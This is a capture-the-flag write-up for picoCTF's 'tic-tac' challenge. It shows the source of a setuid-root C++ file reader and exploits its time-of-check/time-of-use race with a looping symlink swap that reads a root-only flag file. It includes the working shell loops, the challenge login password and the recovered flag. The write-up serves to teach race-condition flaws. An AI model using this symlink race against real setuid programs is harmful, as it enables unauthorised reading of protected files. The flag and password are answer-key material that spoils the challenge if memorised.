# tic-tac
Someone created a program to read text files; we think the program reads files with root privileges but apparently it only accepts to read files that are owned by the user running it. (200 Points)
ssh to saturn.picoctf.net:49182, and run the binary named "txtreader" once connected. Login as ctf-player with the password, d137d16e

## Solution
The home directory contains the following files:
```
ctf-player@pico-chall$ ls -al
total 56
drwxr-xr-x 1 ctf-player ctf-player    84 Mar 22 22:11 .
drwxr-xr-x 1 root       root          24 Mar 16 02:27 ..
drwx------ 2 ctf-player ctf-player    34 Mar 22 21:58 .cache
drwxrwxr-x 3 ctf-player ctf-player    19 Mar 22 22:01 .local
-rw-r--r-- 1 root       root          67 Mar 16 02:28 .profile
-rw------- 1 root       root          32 Mar 16 02:28 flag.txt
-rw-r--r-- 1 ctf-player ctf-player   912 Mar 16 01:30 src.cpp
-rwsr-xr-x 1 root       root       19016 Mar 16 02:28 txtreader
ctf-player@pico-chall$
```

The code of the program is given:
```cpp
#include <iostream>
#include <fstream>
#include <unistd.h>
#include <sys/stat.h>

int main(int argc, char *argv[]) {
  if (argc != 2) {
    std::cerr << "Usage: " << argv[0] << " <filename>" << std::endl;
    return 1;
  }

  std::string filename = argv[1];
  std::ifstream file(filename);
  struct stat statbuf;

  // Check the file's status information.
  if (stat(filename.c_str(), &statbuf) == -1) {
    std::cerr << "Error: Could not retrieve file information" << std::endl;
    return 1;
  }

  // Check the file's owner.
  if (statbuf.st_uid != getuid()) {         // <----- TIME OF CHECK
    std::cerr << "Error: you don't own this file" << std::endl;
    return 1;
  }

  // Read the contents of the file.
  if (file.is_open()) {                     // <----- TIME OF USE
    std::string line;
    while (getline(file, line)) {
      std::cout << line << std::endl;
    }
  } else {
    std::cerr << "Error: Could not open file" << std::endl;
    return 1;
  }

  return 0;
}
```

It compares the userid with the uid of the file, that we want to read out. If they dont match, the program wont read out the content. In our case that will be the 'flag.txt' file:
```
-rw------- 1 root       root          32 Mar 16 02:28 flag.txt
```

As we can see we dont have the permissions to read it. But there is a race condition between the check for the uid an reading out the file, that we can abuse, called TOCTOU (Time-of-check to time-of-use). The Time-of-check will be in the line `if (statbuf.st_uid != getuid()) {` and the time of use in `if (file.is_open()) {`. I added the comments in the code aswell. Our goal is it now to change the file we want to read out in between those two.

One approach is to create a symbolic link, pointing on a valid file that we can read out and changing it after the check to our 'flag.txt'. For being this quick we can contantly toggle the link with a while loop: `while true; do ln -sf flag.txt flip; ln -sf test flip; done &`

Than we just have to run the program and try to read the symlink. If we hit the right timing we get our flag. To increase our chances, we will it in a loop aswell: `for i in {1..30}; do ./txtreader flip; done`.

Took several tries, but in the end we won our race:
```
ctf-player@pico-chall$ touch test
ctf-player@pico-chall$ while true; do ln -sf flag.txt flip; ln -sf test flip; done &
[1] 46757
ctf-player@pico-chall$ for i in {1..30}; do ./txtreader flip; done
Error: you don't own this file
Error: you don't own this file
Error: you don't own this file
Error: you don't own this file
Error: you don't own this file
Error: you don't own this file
Error: you don't own this file
Error: you don't own this file
Error: you don't own this file
Error: you don't own this file
Error: you don't own this file
Error: you don't own this file
ctf-player@pico-chall$ for i in {1..30}; do ./txtreader flip; done
Error: you don't own this file
Error: you don't own this file
Error: you don't own this file
Error: you don't own this file
Error: you don't own this file
Error: you don't own this file
Error: you don't own this file
Error: you don't own this file
Error: you don't own this file
Error: you don't own this file
Error: you don't own this file
Error: you don't own this file
Error: you don't own this file
Error: you don't own this file
Error: you don't own this file
ctf-player@pico-chall$ for i in {1..30}; do ./txtreader flip; done
Error: you don't own this file
Error: you don't own this file
Error: you don't own this file
picoCTF{ToctoU_!s_3a5y_f482a247}
Error: you don't own this file
Error: you don't own this file
Error: you don't own this file
Error: you don't own this file
Error: you don't own this file
Error: you don't own this file
Error: you don't own this file
Error: you don't own this file
Error: you don't own this file
ctf-player@pico-chall$ kill 46757
```

## Further reading
https://samsclass.info/127/proj/E10.htm
